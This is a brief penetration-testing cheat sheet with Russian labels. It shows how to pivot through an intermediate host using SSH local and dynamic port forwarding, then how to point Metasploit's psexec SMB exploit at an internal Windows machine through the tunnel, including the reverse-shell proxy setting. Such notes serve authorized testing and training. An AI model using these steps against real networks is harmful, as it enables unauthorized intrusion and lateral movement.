# Pivoting with SSH Local Port Forwarding

`192.168.1.50` - промежуточный узел
`user` - пользователь промежуточного узла (обычный пользователь)
`192.168.1.20` - конечный узел
`7777` - порт локальном узле
`445` - порт на конечном узле

`ssh -L 7777:192.168.1.20:445 user@192.168.1.50`

`-L` - local port forward

`msf6 exploit(windows/smb/psexec) > set RHOST 127.0.0.1`

`msf6 exploit(windows/smb/psexec) > set RPORT 7777`

# Pivoting with SSH Dynamic Port Forwarding

`ssh -D 9999 user@192.168.1.50`

`-D` - dynamically forward ports

`msf6 exploit(windows/smb/psexec) > set Proxies socks4:127.0.0.1:9999`

`msf6 exploit(windows/smb/psexec) > set ReverseAllowProxy true`

`ReverseAllowProxy` tells Metasploit that the reverse connection will be outside of the proxy